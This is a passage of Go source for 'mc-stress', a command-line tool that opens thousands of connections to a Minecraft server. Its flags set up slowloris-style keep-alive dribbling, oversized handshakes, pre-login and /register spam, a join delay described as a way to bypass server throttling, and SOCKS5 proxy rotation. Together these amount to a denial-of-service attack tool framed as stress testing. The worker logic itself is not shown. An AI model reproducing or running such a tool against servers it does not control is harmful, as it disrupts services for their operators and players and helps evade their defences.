		fmt.Printf("mc-stress  target=%s  workers=%d  bloat=%d  dribble=%s  join-delay=%s\n\n",
			target, workers, bloatSize, dribble, joinDelay)

		go startReporter()

		for i := 0; i < workers; i++ {
			go worker(target, port, bloatSize, dribble, verbose, time.Now().UnixNano()+int64(i), prelogin, har)
		}

		select {}
	},
}

func init() {
	initConfig()
	f := rootCmd.Flags()
	f.IntP("workers", "w", 10000, "concurrent connections to maintain")
	f.IntP("bloat-size", "s", 255, "handshake server-address string length (max 255)")
	f.DurationP("dribble-interval", "d", 5*time.Second, "interval between keep-alive bytes")
	f.BoolP("verbose", "v", false, "print per-connection TCP errors")
	f.Bool("debug", false, "single-connection debug mode with colored packet log")
	f.DurationP("join-delay", "j", 0, "minimum gap between new connections (e.g. 4001ms to bypass server throttle)")
	f.StringP("access-token", "a", "", "Mojang access token (online-mode auth)")
	f.StringP("player-uuid", "u", "", "Mojang player UUID matching the access token")
	f.BoolP("login", "l", false, "automatically send /register commands after join")
	f.Bool("prelogin", false, "enable pre-login spam mode (AsyncPlayerPreLoginEvent)")
	f.Bool("har", false, "hit-and-run mode: don't wait for server response in pre-login mode")
	f.StringP("proxies", "p", "", "path to .txt file with SOCKS5 proxies")
	viper.BindPFlags(f)
}

func initConfig() {
	home, err := os.UserHomeDir()
	if err == nil {
		viper.AddConfigPath(home)
	}
	viper.AddConfigPath(".")
	viper.SetConfigName("gaslighterc")
	viper.SetConfigType("toml")

	viper.AutomaticEnv()

	if err := viper.ReadInConfig(); err == nil {
		// fmt.Println("Using config file:", viper.ConfigFileUsed())
	}
}

func main() {
	if err := rootCmd.Execute(); err != nil {
		os.Exit(1)
	}
}
